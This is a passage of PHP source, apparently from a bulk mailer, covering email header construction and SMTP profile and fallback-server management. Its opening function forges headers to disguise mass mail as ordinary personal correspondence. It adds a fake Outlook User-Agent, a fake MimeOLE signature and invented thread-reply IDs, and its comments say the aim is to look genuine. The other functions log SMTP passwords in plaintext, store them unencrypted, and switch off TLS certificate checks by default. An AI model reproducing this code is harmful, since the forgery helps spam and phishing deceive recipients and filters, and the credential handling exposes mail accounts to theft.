    $mail->addCustomHeader('X-MSMail-Priority', 'Normal');
    $mail->addCustomHeader('X-MimeOLE', 'Produced By Microsoft MimeOLE V6.00.2900.2180');
    $mail->addCustomHeader('Precedence', 'bulk');
    $mail->addCustomHeader('Importance', 'Normal');
    $log("Added common legitimate email headers");

    // Add a message ID reference for threading - this makes emails look like genuine correspondence
    if (empty($emailData['references']) && empty($emailData['in_reply_to'])) {
        // Generate a fake reference ID for the "previous" message
        $prevMessageId = '<' . (time() - 86400) . '.' . md5(uniqid(rand(), true) . 'prev') . '@' . $fromDomain . '>';
        $mail->addCustomHeader('References', $prevMessageId);
        $mail->addCustomHeader('In-Reply-To', $prevMessageId);
        $log("Added synthetic message references for better threading appearance");
    }

    // Organization header helps with legitimacy for business emails
    if (!empty($emailData['organization'])) {
        $mail->addCustomHeader('Organization', $emailData['organization']);
        $log("Added Organization header: " . $emailData['organization']);
    } else if (strpos($fromDomain, '.') !== false) {
        // If no organization specified, use the domain name with first letter capitalized
        $orgName = ucfirst(explode('.', $fromDomain)[0]);
        $mail->addCustomHeader('Organization', $orgName);
        $log("Added default Organization header: " . $orgName);
    }

    // Set content-type parameters correctly - this affects MIME parsing
    $mail->addCustomHeader('Content-Type-Hint', 'text/html; charset=UTF-8');

    // Add List-Unsubscribe header (important for marketing/bulk emails)
    if (!empty($emailData['unsubscribe_url'])) {
        $mail->addCustomHeader('List-Unsubscribe', '<' . $emailData['unsubscribe_url'] . '>');
        $mail->addCustomHeader('List-Unsubscribe-Post', 'List-Unsubscribe=One-Click');
        $log("Added List-Unsubscribe header: " . $emailData['unsubscribe_url']);
    }

    // User-Agent helps identify as a legitimate email client
    $mail->addCustomHeader('User-Agent', 'Microsoft Outlook 16.0');
    $log("Added User-Agent header");

    return $mail;
}

/**
 * Save fallback SMTP settings to the session
 * 
 * @param array $fallbackSmtpSettings Fallback SMTP settings
 * @param bool $enableFallback Whether to enable the fallback mechanism
 * @return array Response with status and message
 */
function saveFallbackSmtpSettings($fallbackSmtpSettings, $enableFallback = false)
{
    try {
        // Debug log
        error_log("Saving fallback SMTP settings: " . json_encode($fallbackSmtpSettings) . ", Enable: " . ($enableFallback ? 'true' : 'false'));

        // Start session if not already started
        if (session_status() == PHP_SESSION_NONE && !headers_sent()) {
            session_start();
        }

        // Create custom settings array in session if it doesn't exist
        if (!isset($_SESSION['custom_settings'])) {
            $_SESSION['custom_settings'] = [];
        }

        // Update fallback SMTP settings
        $_SESSION['custom_settings']['fallback_smtp'] = [
            'host' => $fallbackSmtpSettings['host'] ?? '',
            'port' => $fallbackSmtpSettings['port'] ?? 587,
            'encryption' => $fallbackSmtpSettings['encryption'] ?? 'tls',
            'security' => $fallbackSmtpSettings['encryption'] ?? 'tls', // Add security key for consistency
            'username' => $fallbackSmtpSettings['username'] ?? '',
            'password' => $fallbackSmtpSettings['password'] ?? ''
        ];

        // Save the enable fallback setting
        $_SESSION['custom_settings']['enable_fallback_smtp'] = $enableFallback;

        // Debug log after saving
        error_log("Fallback SMTP settings saved to session: " . json_encode($_SESSION['custom_settings']['fallback_smtp']));
        error_log("Fallback SMTP enabled: " . ($_SESSION['custom_settings']['enable_fallback_smtp'] ? 'true' : 'false'));

        return [
            'status' => 'success',
            'message' => 'Fallback SMTP settings saved successfully!'
        ];
    } catch (Exception $e) {
        error_log("Error saving fallback SMTP settings: " . $e->getMessage());
        return [
            'status' => 'error',
            'message' => 'Error saving fallback SMTP settings: ' . $e->getMessage()
        ];
    }
}

/**
 * Get fallback SMTP settings from config or session
 * 
 * @return array Fallback SMTP settings
 */
function getFallbackSmtpSettings()
{
    // Start session if not already started
    if (session_status() == PHP_SESSION_NONE && !headers_sent()) {
        session_start();
    }

    // Get default fallback SMTP settings from config
    $defaultSettings = [
        'host' => config('fallback_smtp.host', ''),
        'port' => config('fallback_smtp.port', 587),
        'encryption' => config('fallback_smtp.encryption', 'tls'),
        'security' => config('fallback_smtp.encryption', 'tls'), // Add security for consistency
        'username' => config('fallback_smtp.username', ''),
        'password' => config('fallback_smtp.password', '')
    ];

    // Check if we have custom fallback SMTP settings in session
    if (isset($_SESSION['custom_settings']) && isset($_SESSION['custom_settings']['fallback_smtp'])) {
        $sessionSettings = $_SESSION['custom_settings']['fallback_smtp'];
        error_log("Found fallback SMTP settings in session: " . json_encode($sessionSettings));
    } else {
        $sessionSettings = [];
        error_log("No fallback SMTP settings found in session, using defaults");
    }

    // Merge session settings with default settings (session takes precedence)
    $mergedSettings = array_merge($defaultSettings, $sessionSettings);

    // Ensure consistent field naming regardless of source
    if (isset($mergedSettings['encryption']) && !isset($mergedSettings['security'])) {
        $mergedSettings['security'] = $mergedSettings['encryption'];
    } else if (isset($mergedSettings['security']) && !isset($mergedSettings['encryption'])) {
        $mergedSettings['encryption'] = $mergedSettings['security'];
    }

    error_log("Returning merged fallback SMTP settings: " . json_encode($mergedSettings));
    return $mergedSettings;
}

/**
 * Check if fallback SMTP is enabled
 * 
 * @return bool Whether fallback SMTP is enabled
 */
function isFallbackSmtpEnabled()
{
    // Start session if not already started
    if (!isset($_SESSION) && !headers_sent()) {
        session_start();
    }

    // Check if fallback SMTP is enabled in session
    if (isset($_SESSION['custom_settings']) && isset($_SESSION['custom_settings']['enable_fallback_smtp'])) {
        return (bool)$_SESSION['custom_settings']['enable_fallback_smtp'];
    }

    // Otherwise check config
    return config('enable_fallback_smtp', false);
}

/**
 * Test fallback SMTP connection without sending an email
 * 
 * @param array $fallbackSmtpSettings Fallback SMTP settings
 * @return array Response with status and message
 */
function testFallbackSmtpConnection($fallbackSmtpSettings)
{
    // Create error log file if it doesn't exist
    $logFile = config('logging.dir', __DIR__ . '/../logs') . '/fallback_smtp_test.log';
    $logDir = dirname($logFile);
    if (!file_exists($logDir)) {
        mkdir($logDir, 0755, true);
    }

    // Start logging
    file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] Starting fallback SMTP connection test\n", FILE_APPEND);
    file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] Host: {$fallbackSmtpSettings['host']}, Port: {$fallbackSmtpSettings['port']}, Security: {$fallbackSmtpSettings['encryption']}\n", FILE_APPEND);

    try {
        // Initialize PHPMailer
        $mail = new PHPMailer(true);

        // Enable debug output
        $mail->SMTPDebug = $fallbackSmtpSettings['debug_level'] ?? 2;
        $mail->Debugoutput = function ($str, $level) use ($logFile) {
            file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] [Debug-$level] $str\n", FILE_APPEND);
        };

        // Server settings
        $mail->isSMTP();
        $mail->Host = $fallbackSmtpSettings['host'];
        $mail->Port = $fallbackSmtpSettings['port'];
        $mail->SMTPSecure = $fallbackSmtpSettings['encryption'];
        $mail->SMTPAuth = !empty($fallbackSmtpSettings['username']);

        // Only set username/password if provided
        if (!empty($fallbackSmtpSettings['username'])) {
            $mail->Username = $fallbackSmtpSettings['username'];
            $mail->Password = $fallbackSmtpSettings['password'];
        }

        // SSL verification
        $mail->SMTPOptions = [
            'ssl' => [
                'verify_peer' => $fallbackSmtpSettings['verify_ssl'] ?? false,
                'verify_peer_name' => $fallbackSmtpSettings['verify_ssl'] ?? false,
                'allow_self_signed' => !($fallbackSmtpSettings['verify_ssl'] ?? false)
            ]
        ];

        // Connect only, don't send email
        $mail->smtpConnect();

        // If we got here, connection was successful
        file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] Fallback SMTP connection test successful\n", FILE_APPEND);
        return [
            'status' => 'success',
            'message' => 'Successfully connected to fallback SMTP server.',
            'details' => [
                'host' => $fallbackSmtpSettings['host'],
                'port' => $fallbackSmtpSettings['port'],
                'encryption' => $fallbackSmtpSettings['encryption'],
                'auth' => !empty($fallbackSmtpSettings['username'])
            ]
        ];
    } catch (Exception $e) {
        // Log the error
        $errorMsg = $e->getMessage();
        file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] Fallback SMTP connection failed: $errorMsg\n", FILE_APPEND);

        return [
            'status' => 'error',
            'message' => "Failed to connect to fallback SMTP server: $errorMsg",
            'details' => [
                'host' => $fallbackSmtpSettings['host'],
                'port' => $fallbackSmtpSettings['port'],
                'encryption' => $fallbackSmtpSettings['encryption'],
                'auth' => !empty($fallbackSmtpSettings['username'])
            ]
        ];
    }
}

/**
 * Save an SMTP profile with a name
 * 
 * @param array $smtpSettings The SMTP settings to save
 * @param string $profileName The name to save the profile under
 * @return array Response with status and message
 */
function saveSmtpProfile($smtpSettings, $profileName)
{
    try {
        // Debug log
        error_log("Saving SMTP profile: " . $profileName . " - Settings: " . json_encode($smtpSettings));

        // Ensure data directory exists
        $dataDir = __DIR__ . '/../data';
        if (!is_dir($dataDir)) {
            mkdir($dataDir, 0755, true);
        }

        $profilesFile = $dataDir . '/smtp_profiles.json';

        // Load existing profiles
        $profiles = [];
        if (file_exists($profilesFile)) {
            $profilesJson = file_get_contents($profilesFile);
            $profiles = json_decode($profilesJson, true) ?: [];
        }

        // Validate profile name
        if (empty($profileName)) {
            return [
                'status' => 'error',
                'message' => 'Profile name cannot be empty'
            ];
        }

        // Save the profile
        $profiles[$profileName] = [
            'host' => $smtpSettings['host'] ?? '',
            'port' => $smtpSettings['port'] ?? 587,
            'security' => $smtpSettings['encryption'] ?? 'tls',
            'encryption' => $smtpSettings['encryption'] ?? 'tls',
            'username' => $smtpSettings['username'] ?? '',
            'password' => $smtpSettings['password'] ?? '',
            'debug' => $smtpSettings['debug_level'] ?? 0,
            'debug_level' => $smtpSettings['debug_level'] ?? 0,
            'verify_ssl' => $smtpSettings['verify_ssl'] ?? false,
            'sender_email' => $smtpSettings['sender_email'] ?? '', // Optional default sender email
            'name' => $profileName
        ];

        // Save to file
        file_put_contents($profilesFile, json_encode($profiles, JSON_PRETTY_PRINT));

        // Also save to session for backward compatibility
        if (session_status() == PHP_SESSION_NONE && !headers_sent()) {
            session_start();
        }
        if (!isset($_SESSION['smtp_profiles'])) {
            $_SESSION['smtp_profiles'] = [];
        }
        $_SESSION['smtp_profiles'] = $profiles;

        // Debug log after saving
        error_log("SMTP profile saved: " . $profileName);

        return [
            'status' => 'success',
            'message' => 'SMTP profile "' . $profileName . '" saved successfully!'
        ];
    } catch (Exception $e) {
        error_log("Error saving SMTP profile: " . $e->getMessage());
        return [
            'status' => 'error',
            'message' => 'Error saving SMTP profile: ' . $e->getMessage()
        ];
    }
}

/**
 * Get all saved SMTP profiles
 * 
 * @return array List of saved SMTP profiles
 */
function getSmtpProfiles()
{
    // Load profiles from file using absolute path
    $profilesFile = '/var/www/html/data/smtp_profiles.json';

    // Debug information
    error_log("Looking for profiles file at: " . $profilesFile);

    $profiles = [];

    if (file_exists($profilesFile)) {
        error_log("Profiles file exists");
        $profilesJson = file_get_contents($profilesFile);
        error_log("Profiles content: " . $profilesJson);
        $profiles = json_decode($profilesJson, true) ?: [];
        error_log("Decoded profiles: " . print_r($profiles, true));
    } else {
        error_log("Profiles file does not exist at: " . $profilesFile);
    }

    // Also store in session for backward compatibility
    if (session_status() == PHP_SESSION_NONE && !headers_sent()) {
        session_start();
    }
    $_SESSION['smtp_profiles'] = $profiles;

    return $profiles;
}

/**
 * Get a specific SMTP profile by name
 * 
 * @param string $profileName The name of the profile to retrieve
 * @return array|null The SMTP profile or null if not found
 */
function getSmtpProfile($profileName)
{
    $profiles = getSmtpProfiles();

    // Return the profile if it exists
    if (isset($profiles[$profileName])) {
        return $profiles[$profileName];
    }

    return null;
}

/**
 * Delete an SMTP profile
 * 
 * @param string $profileName The name of the profile to delete
 * @return array Response with status and message
 */
function deleteSmtpProfile($profileName)
{
    try {
        $profilesFile = __DIR__ . '/../data/smtp_profiles.json';

        // Load existing profiles
        $profiles = [];
        if (file_exists($profilesFile)) {
            $profilesJson = file_get_contents($profilesFile);
            $profiles = json_decode($profilesJson, true) ?: [];
        }

        // Check if profile exists
        if (!isset($profiles[$profileName])) {
            return [
                'status' => 'error',
                'message' => 'Profile "' . $profileName . '" not found'
            ];
        }

        // Delete the profile
        unset($profiles[$profileName]);

        // Save back to file
        file_put_contents($profilesFile, json_encode($profiles, JSON_PRETTY_PRINT));

        // Update session for backward compatibility
        if (session_status() == PHP_SESSION_NONE && !headers_sent()) {
            session_start();
        }
        $_SESSION['smtp_profiles'] = $profiles;

        error_log("SMTP profile deleted: " . $profileName);

        return [
            'status' => 'success',
            'message' => 'SMTP profile "' . $profileName . '" deleted successfully!'
        ];
    } catch (Exception $e) {
        error_log("Error deleting SMTP profile: " . $e->getMessage());
        return [
            'status' => 'error',
            'message' => 'Error deleting SMTP profile: ' . $e->getMessage()
        ];
    }
}

/**
 * Apply an SMTP profile as the current settings
 * 
 * @param string $profileName The name of the profile to apply
 * @return array Response with status and message
 */
function applySmtpProfile($profileName)
{
    try {
        // Get the profile
        $profile = getSmtpProfile($profileName);

        // Check if profile exists
        if (!$profile) {
            return [
                'status' => 'error',
                'message' => 'Profile "' . $profileName . '" not found'
            ];
        }

        // Save as current SMTP settings
        $result = saveSmtpSettings($profile);

        if ($result['status'] === 'success') {
            return [
                'status' => 'success',
                'message' => 'SMTP profile "' . $profileName . '" applied successfully!'
            ];
        } else {
            return $result;
        }
    } catch (Exception $e) {
        error_log("Error applying SMTP profile: " . $e->getMessage());
        return [
            'status' => 'error',
            'message' => 'Error applying SMTP profile: ' . $e->getMessage()
        ];
    }
}
